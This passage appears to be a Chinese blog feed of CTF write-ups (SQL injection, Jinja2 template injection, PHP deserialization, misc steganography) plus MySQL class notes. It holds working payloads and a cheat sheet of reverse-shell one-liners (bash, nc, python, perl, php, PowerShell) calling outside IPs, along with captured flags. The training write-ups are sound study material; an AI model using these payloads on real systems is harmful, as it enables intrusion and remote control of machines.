    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506210636892.png" alt="image-20200506210636892"></p><p>发现敏感信息。</p><p>利用PHP伪协议读取源码</p><p><code>index.php：</code></p><pre><code class="PHP">&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file)){    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {        echo(&#39;no way!&#39;);        exit;    }    @include($file);}?&gt;</code></pre><p>这里的正则因为是/i对大小写不敏感所以我没办法绕过。</p><p>search.php</p><pre><code>&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        if(!$row) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;&lt;p&gt;å§å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;    } else {        $msg = &quot;æªæ¾å°è®¢å!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;}?&gt;</code></pre><p>index.php中无法实现绕过，考虑使用二次注入。</p><p>会发现查询页面会有回显，修改页面存在报错。通过查询页面可以知道，只有地址存在’。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)<em>#</em></p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506224723491.png" alt="image-20200506224723491"></p><p>利用load_file读取flag.txt</p><blockquote><p>errorXPATH syntax error: ‘~flag{8fbc88cb-5172-4418-b655-f6’</p></blockquote><p>发现显示的不完整。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select right(load_file(‘/flag.txt’),20)),0x7e),1)#</p></blockquote><blockquote><p>errorXPATH syntax error: ‘~-b655-f6bb7aabe0fc} ~’</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[MRCTF2020]PYWebsite</title>
    <link href="http://yoursite.com/2020/05/05/[MRCTF2020]PYWebsite/"/>
    <id>http://yoursite.com/2020/05/05/[MRCTF2020]PYWebsite/</id>
    <published>2020-05-05T11:17:34.924Z</published>
    <updated>2020-05-05T11:17:34.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>F12发现了</p><blockquote><p>/js/md5.js</p></blockquote><table><thead><tr><th>function enc(code){</th><th></th></tr></thead><tbody><tr><td></td><td>hash = hex_md5(code);</td></tr><tr><td></td><td>return hash;</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>function validate(){</td></tr><tr><td></td><td>var code = document.getElementById(“vcode”).value;</td></tr><tr><td></td><td>if (code != “”){</td></tr><tr><td></td><td>if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”){</td></tr><tr><td></td><td>alert(“您通过了验证！”);</td></tr><tr><td></td><td>window.location = “./flag.php”</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“你的授权码不正确！”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“请输入授权码”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td></td></tr><tr><td></td><td>}</td></tr></tbody></table><p>说输入code与某值进行比较，相等就出现flag。所以现在就是分析加密函数。</p><blockquote><p> if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”)</p></blockquote><blockquote><pre><code>function hex_md5(s){ return binl2hex(core_md5(str2binl(s), s.length * 8));}</code></pre></blockquote><p>可以看到hex_md5就是通过core_md5加密str2bin1加密后的code先去看看strbin函数</p><pre><code>function str2binl(str){  var bin = Array();  var mask = (1 &lt;&lt; 8) - 1;//mask=255  for(var i = 0; i &lt; str.length * 8; i += 8)    bin[i&gt;&gt;5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (i%32);  return bin;}</code></pre><p>额，算了好麻烦。。。换个思路直接读取flag.php(强行狡辩，其实我忘记可以直接读取的了)</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200505180527740.png" alt="image-20200505180527740"></p><p>xff绕过。</p><p>flag{abd61860-ad51-41aa-8a19-6d7c43cbac68}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MRCTF2020-PYWebsite&quot;&gt;&lt;a href=&quot;#MRCTF2020-PYWebsite&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]PYWebsite&quot;&gt;&lt;/a&gt;[MRCTF2020]PYWebsite&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[GYCTF2020]FlaskApp</title>
    <link href="http://yoursite.com/2020/05/03/[GYCTF2020]FlaskApp/"/>
    <id>http://yoursite.com/2020/05/03/[GYCTF2020]FlaskApp/</id>
    <published>2020-05-03T10:48:01.753Z</published>
    <updated>2020-05-03T10:48:01.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>在提示页面f12发现了一段神奇的cookie</p><blockquote><p>eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ</p></blockquote><p>在网站的解密页面解密一下。突然就跳转到了一个神奇的页面</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503171137795.png" alt="image-20200503171137795"></p><p>发现这是WSGI</p><p>在加密界面输入12，解密解密成功回显12</p><p>这里有个脚本</p><blockquote><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}> ```![image-20200503183556194](C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\image-20200503183556194.png)`{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`最后用切片操作读取flag`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}`</code></pre></blockquote><p>下面是一些链接：</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10251892.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/10251892.html</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GYCTF2020-FlaskApp&quot;&gt;&lt;a href=&quot;#GYCTF2020-FlaskApp&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]FlaskApp&quot;&gt;&lt;/a&gt;[GYCTF2020]FlaskApp&lt;/h2&gt;&lt;p&gt;在提示页
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[FBCTF2019]RCEService</title>
    <link href="http://yoursite.com/2020/05/02/[FBCTF2019]RCEService/"/>
    <id>http://yoursite.com/2020/05/02/[FBCTF2019]RCEService/</id>
    <published>2020-05-02T11:46:52.215Z</published>
    <updated>2020-05-02T11:46:52.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200502191258431.png" alt="image-20200502191258431"></p><p>当输入{“cmd”:”ls”}有回显，但是不能读取。</p><p>本来想拼接字符串的但是没有成功。</p><p><a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">https://xz.aliyun.com/t/5399</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#FBCTF2019-RCEService&quot; class=&quot;headerlink&quot; title=&quot;[FBCTF2019]RCEService&quot;&gt;&lt;/a&gt;[FBCTF2019]RCEService&lt;/h2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[V&amp;N2020 公开赛]CHECKIN</title>
    <link href="http://yoursite.com/2020/05/02/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]CHECKIN/"/>
    <id>http://yoursite.com/2020/05/02/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]CHECKIN/</id>
    <published>2020-05-02T11:12:23.753Z</published>
    <updated>2020-05-02T11:12:23.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>看到这题的时候并不会做。考点是反弹shell。</p><p>收集一点可能用上的反弹shell命令</p><p><strong><em>1\</em></strong>|<strong><em>0**</em></strong>bash**</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre><p><strong><em>2\</em></strong>|<strong><em>0**</em></strong>nc**</p><pre><code>nc -e /bin/sh ip port</code></pre><p><strong><em>3\</em></strong>|<strong><em>0**</em></strong>python**</p><pre><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p><strong><em>4\</em></strong>|<strong><em>0**</em></strong>perl**</p><pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.224.117:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p><strong><em>5\</em></strong>|<strong><em>0**</em></strong>php**</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><strong><em>6\</em></strong>|<strong><em>0**</em></strong>PowerShell**</p><pre><code>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&#39;$c=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2&gt;&amp;1 | Out-String );$sb2=$sb+&#39;&#39;PS &#39;&#39;+(pwd).Path+&#39;&#39;&gt; &#39;&#39;;$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&#39;))powershell -nop -enc {reverse shell command}</code></pre><p>参考：<a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p><p>连入后因为：</p><p>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</p><p>执行</p><p><code>python3 -c &quot;import os;[os.system(&#39;cat /proc/&#39;+str(i)+&#39;/fd/&#39;+str(j)) for i in range(20) for j in range(10)];&quot;</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;V-amp-N2020-公开赛-CHECKIN&quot;&gt;&lt;a href=&quot;#V-amp-N2020-公开赛-CHECKIN&quot; class=&quot;headerlink&quot; title=&quot;[V&amp;amp;N2020 公开赛]CHECKIN&quot;&gt;&lt;/a&gt;[V&amp;amp;N2020 公开赛
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF misc部分解题</title>
    <link href="http://yoursite.com/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/"/>
    <id>http://yoursite.com/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/</id>
    <published>2020-04-30T08:51:00.377Z</published>
    <updated>2020-04-30T08:51:00.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-misc部分解题"><a href="#BUUCTF-misc部分解题" class="headerlink" title="BUUCTF misc部分解题"></a>BUUCTF misc部分解题</h1><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>是个exe文件利用file进行查看</p><blockquote><p>$ file KEY.exe<br>KEY.exe: ASCII text, with very long lines, with no line terminators</p></blockquote><p>将后缀名改为txt。</p><p>bases64解密然后改为png，发现没有用。</p><p>直接复制到url栏试试看。扫描二维码就可以了。</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200430152341644.png" alt="image-20200430152341644"></p><p>IHDR后面的8个字节为图片的宽高修改宽高，就出现了flag。</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>根据提示，是压缩包破解的事情。直接爆破,在kali中输入。</p><blockquote><p>1、安装rarcrack</p><pre><code class="bash">apt-get install rarcrack</code></pre><p>2、指定文件进行爆破，其中type有 rar、zip、7z 三种类型</p><pre><code class="bash">rarcrack 文件名 --threads 50 --type rar</code></pre></blockquote><p>爆破出来是</p><blockquote><p>ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</p></blockquote><p>flag{70354300a5100ba78068805661b93a5c}</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>用png打开图片，winhex打开直接就发现了。</p><blockquote><p>flag{stego_is_s0_bor1ing}</p></blockquote><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><blockquote><p>flag{97314e7864a8f62627b26f3f998c37f1}</p></blockquote><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>题目直接写出来了，<strong>LSB隐写</strong></p><p>使用工具<strong>Stegsolve</strong>分析，这个工具是misc最常用工具，需要配置java环境，配置教程和资源在百度比较容易找到，这里不再提供。</p><p>查看<strong>各个色道</strong>，没有发现隐藏信息，</p><p>点击<strong>Analyse→Data Extract</strong></p><p>选中<strong>LSB First</strong></p><p>参数如下时发现隐藏信息,有一个明显的<strong>PNG头</strong>，<strong>save bin</strong>提取出来保存为图片</p><p><img src="https://blog.xiafeng2333.top/content/images/2019/09/15.png" alt="15"></p><p>是一张二维码，</p><p><img src="https://blog.xiafeng2333.top/content/images/2019/09/16.png" alt="16"></p><p>扫码得到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF-misc部分解题&quot;&gt;&lt;a href=&quot;#BUUCTF-misc部分解题&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF misc部分解题&quot;&gt;&lt;/a&gt;BUUCTF misc部分解题&lt;/h1&gt;&lt;h2 id=&quot;N种方法解决&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MySQL基础课堂笔记</title>
    <link href="http://yoursite.com/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-29T07:30:26.468Z</published>
    <updated>2020-04-29T07:30:26.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="今日内容"><a href="#今日内容" class="headerlink" title="今日内容"></a>今日内容</h1><ol><li>数据库的基本概念</li></ol><ol start="2"><li><p>MySQL数据库软件</p><ol><li>安装</li><li>卸载</li><li>配置</li></ol></li><li><p>SQL</p></li></ol><h2 id="数据库的基本概念"><a href="#数据库的基本概念" class="headerlink" title="数据库的基本概念"></a>数据库的基本概念</h2><pre><code>1. 数据库的英文单词： DataBase 简称 ： DB2. 什么数据库？    * 用于存储和管理数据的仓库。3. 数据库的特点：    1. 持久化存储数据的。其实数据库就是一个文件系统    2. 方便存储和管理数据    3. 使用了统一的方式操作数据库 -- SQL</code></pre><p>​<br>    4. 常见的数据库软件<br>        * 参见《MySQL基础.pdf》</p><h1 id="MySQL数据库软件"><a href="#MySQL数据库软件" class="headerlink" title="MySQL数据库软件"></a>MySQL数据库软件</h1><pre><code>1. 安装    * 参见《MySQL基础.pdf》2. 卸载    1. 去mysql的安装目录找到my.ini文件        * 复制 datadir=&quot;C:/ProgramData/MySQL/MySQL Server 5.5/Data/&quot;    2. 卸载MySQL    3. 删除C:/ProgramData目录下的MySQL文件夹。3. 配置    * MySQL服务启动        1. 手动。        2. cmd--&gt; services.msc 打开服务的窗口        3. 使用管理员打开cmd            * net start mysql : 启动mysql的服务            * net stop mysql:关闭mysql服务    * MySQL登录        1. mysql -uroot -p密码        2. mysql -hip -uroot -p连接目标的密码        3. mysql --host=ip --user=root --password=连接目标的密码    * MySQL退出        1. exit        2. quit    * MySQL目录结构        1. MySQL安装目录：basedir=&quot;D:/develop/MySQL/&quot;            * 配置文件 my.ini        2. MySQL数据目录：datadir=&quot;C:/ProgramData/MySQL/MySQL Server 5.5/Data/&quot;            * 几个概念                * 数据库：文件夹                * 表：文件                * 数据：数据</code></pre><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><pre><code>1.什么是SQL？    Structured Query Language：结构化查询语言    其实就是定义了操作所有关系型数据库的规则。每一种数据库操作的方式存在不一样的地方，称为“方言”。2.SQL通用语法    1. SQL 语句可以单行或多行书写，以分号结尾。    2. 可使用空格和缩进来增强语句的可读性。    3. MySQL 数据库的 SQL 语句不区分大小写，关键字建议使用大写。    4. 3 种注释        * 单行注释: -- 注释内容 或 # 注释内容(mysql 特有)         * 多行注释: /* 注释 */3. SQL分类    1) DDL(Data Definition Language)数据定义语言        用来定义数据库对象：数据库，表，列等。关键字：create, drop,alter 等    2) DML(Data Manipulation Language)数据操作语言        用来对数据库中表的数据进行增删改。关键字：insert, delete, update 等    3) DQL(Data Query Language)数据查询语言        用来查询数据库中表的记录(数据)。关键字：select, where 等    4) DCL(Data Control Language)数据控制语言(了解)        用来定义数据库的访问权限和安全级别，及创建用户。关键字：GRANT， REVOKE 等</code></pre><h2 id="DDL-操作数据库、表"><a href="#DDL-操作数据库、表" class="headerlink" title="DDL:操作数据库、表"></a>DDL:操作数据库、表</h2><pre><code>1. 操作数据库：CRUD    1. C(Create):创建        * 创建数据库：            * create database 数据库名称;        * 创建数据库，判断不存在，再创建：            * create database if not exists 数据库名称;        * 创建数据库，并指定字符集            * create database 数据库名称 character set 字符集名;        * 练习： 创建db4数据库，判断是否存在，并制定字符集为gbk            * create database if not exists db4 character set gbk;    2. R(Retrieve)：查询        * 查询所有数据库的名称:            * show databases;        * 查询某个数据库的字符集:查询某个数据库的创建语句            * show create database 数据库名称;    3. U(Update):修改        * 修改数据库的字符集            * alter database 数据库名称 character set 字符集名称;    4. D(Delete):删除        * 删除数据库            * drop database 数据库名称;        * 判断数据库存在，存在再删除            * drop database if exists 数据库名称;    5. 使用数据库        * 查询当前正在使用的数据库名称            * select database();        * 使用数据库            * use 数据库名称;2. 操作表    1. C(Create):创建        1. 语法：            create table 表名(                列名1 数据类型1,                列名2 数据类型2,                ....                列名n 数据类型n            );            * 注意：最后一列，不需要加逗号（,）            * 数据库类型：                1. int：整数类型                    * age int,                2. double:小数类型                    * score double(5,2)                3. date:日期，只包含年月日，yyyy-MM-dd                4. datetime:日期，包含年月日时分秒     yyyy-MM-dd HH:mm:ss                5. timestamp:时间错类型    包含年月日时分秒     yyyy-MM-dd HH:mm:ss                        * 如果将来不给这个字段赋值，或赋值为null，则默认使用当前的系统时间，来自动赋值                6. varchar：字符串                    * name varchar(20):姓名最大20个字符                    * zhangsan 8个字符  张三 2个字符        * 创建表            create table student(                id int,                name varchar(32),                age int ,                score double(4,1),                birthday date,                insert_time timestamp            );        * 复制表：            * create table 表名 like 被复制的表名;              2. R(Retrieve)：查询        * 查询某个数据库中所有的表名称            * show tables;        * 查询表结构            * desc 表名;    3. U(Update):修改        1. 修改表名            alter table 表名 rename to 新的表名;        2. 修改表的字符集            alter table 表名 character set 字符集名称;        3. 添加一列            alter table 表名 add 列名 数据类型;        4. 修改列名称 类型            alter table 表名 change 列名 新列别 新数据类型;            alter table 表名 modify 列名 新数据类型;        5. 删除列            alter table 表名 drop 列名;    4. D(Delete):删除        * drop table 表名;        * drop table  if exists 表名 ;</code></pre><ul><li>客户端图形化工具：SQLYog</li></ul><h2 id="DML：增删改表中数据"><a href="#DML：增删改表中数据" class="headerlink" title="DML：增删改表中数据"></a>DML：增删改表中数据</h2><pre><code>1. 添加数据：    * 语法：        * insert into 表名(列名1,列名2,...列名n) values(值1,值2,...值n);    * 注意：        1. 列名和值要一一对应。        2. 如果表名后，不定义列名，则默认给所有列添加值            insert into 表名 values(值1,值2,...值n);        3. 除了数字类型，其他类型需要使用引号(单双都可以)引起来2. 删除数据：    * 语法：        * delete from 表名 [where 条件]    * 注意：        1. 如果不加条件，则删除表中所有记录。        2. 如果要删除所有记录            1. delete from 表名; -- 不推荐使用。有多少条记录就会执行多少次删除操作            2. TRUNCATE TABLE 表名; -- 推荐使用，效率更高 先删除表，然后再创建一张一样的表。3. 修改数据：    * 语法：        * update 表名 set 列名1 = 值1, 列名2 = 值2,... [where 条件];    * 注意：        1. 如果不加任何条件，则会将表中所有记录全部修改。</code></pre><h2 id="DQL：查询表中的记录"><a href="#DQL：查询表中的记录" class="headerlink" title="DQL：查询表中的记录"></a>DQL：查询表中的记录</h2><pre><code>* select * from 表名;1. 语法：    select        字段列表    from        表名列表    where        条件列表    group by        分组字段    having        分组之后的条件    order by        排序    limit        分页限定2. 基础查询    1. 多个字段的查询        select 字段名1，字段名2... from 表名；        * 注意：            * 如果查询所有字段，则可以使用*来替代字段列表。    2. 去除重复：        * distinct    3. 计算列        * 一般可以使用四则运算计算一些列的值。（一般只会进行数值型的计算）        * ifnull(表达式1,表达式2)：null参与的运算，计算结果都为null            * 表达式1：哪个字段需要判断是否为null            * 如果该字段为null后的替换值。    4. 起别名：        * as：as也可以省略3. 条件查询    1. where子句后跟条件    2. 运算符        * &gt; 、&lt; 、&lt;= 、&gt;= 、= 、&lt;&gt;        * BETWEEN...AND          * IN( 集合)         * LIKE：模糊查询            * 占位符：                * _:单个任意字符                * %：多个任意字符        * IS NULL          * and  或 &amp;&amp;        * or  或 ||         * not  或 !            -- 查询年龄大于20岁            SELECT * FROM student WHERE age &gt; 20;            SELECT * FROM student WHERE age &gt;= 20;            -- 查询年龄等于20岁            SELECT * FROM student WHERE age = 20;            -- 查询年龄不等于20岁            SELECT * FROM student WHERE age != 20;            SELECT * FROM student WHERE age &lt;&gt; 20;            -- 查询年龄大于等于20 小于等于30            SELECT * FROM student WHERE age &gt;= 20 &amp;&amp;  age &lt;=30;            SELECT * FROM student WHERE age &gt;= 20 AND  age &lt;=30;            SELECT * FROM student WHERE age BETWEEN 20 AND 30;            -- 查询年龄22岁，18岁，25岁的信息            SELECT * FROM student WHERE age = 22 OR age = 18 OR age = 25            SELECT * FROM student WHERE age IN (22,18,25);            -- 查询英语成绩为null            SELECT * FROM student WHERE english = NULL; -- 不对的。null值不能使用 = （!=） 判断            SELECT * FROM student WHERE english IS NULL;            -- 查询英语成绩不为null            SELECT * FROM student WHERE english  IS NOT NULL;            -- 查询姓马的有哪些？ like            SELECT * FROM student WHERE NAME LIKE &#39;马%&#39;;            -- 查询姓名第二个字是化的人            SELECT * FROM student WHERE NAME LIKE &quot;_化%&quot;;            -- 查询姓名是3个字的人            SELECT * FROM student WHERE NAME LIKE &#39;___&#39;;</code></pre><p>​<br>                – 查询姓名中包含德的人<br>                SELECT * FROM student WHERE NAME LIKE ‘%德%’;</p><p>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;今日内容&quot;&gt;&lt;a href=&quot;#今日内容&quot; class=&quot;headerlink&quot; title=&quot;今日内容&quot;&gt;&lt;/a&gt;今日内容&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;数据库的基本概念&lt;/li&gt;
&lt;/ol&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;MySQL数据库软件&lt;/p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[NPUCTF2020]ReadlezPHP</title>
    <link href="http://yoursite.com/2020/04/25/[NPUCTF2020]ReadlezPHP/"/>
    <id>http://yoursite.com/2020/04/25/[NPUCTF2020]ReadlezPHP/</id>
    <published>2020-04-25T11:06:15.827Z</published>
    <updated>2020-04-25T11:06:15.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>首先打开页面观看源码发现了有个隐藏的链接。</p><blockquote><p>/time.php?source</p></blockquote><p>进去后就发现了源码，很明显是PHP的反序列化漏洞。</p><pre><code class="php">&lt;?php#error_reporting(0);class HelloPhp{    public $a;    public $b;    public function __construct(){        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;        $this-&gt;b = &quot;date&quot;;    }    public function __destruct(){        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    }}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){    highlight_file(__FILE__);    die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]);</code></pre><p>构造PHP脚本。</p><pre><code class="PHP">&lt;?phpclass HelloPhp{    public $a;    public $b;}$c = new HelloPhp();$c-&gt;b = &#39;assert&#39;;$c-&gt;a = &#39;phpinfo();&#39;;$c_ser = serialize($c);print_r($c_ser);echo &quot;&lt;/br&gt;&quot;;</code></pre><blockquote><p>O:8:”HelloPhp”:2:{s:1:”a”;s:10:”phpinfo();”;s:1:”b”;s:6:”assert”;}</p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200425190223654.png" alt="image-20200425190223654"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;NPUCTF2020-ReadlezPHP&quot;&gt;&lt;a href=&quot;#NPUCTF2020-ReadlezPHP&quot; class=&quot;headerlink&quot; title=&quot;[NPUCTF2020]ReadlezPHP&quot;&gt;&lt;/a&gt;[NPUCTF2020]ReadlezPHP
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache SSI 远程命令执行漏洞</title>
    <link href="http://yoursite.com/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
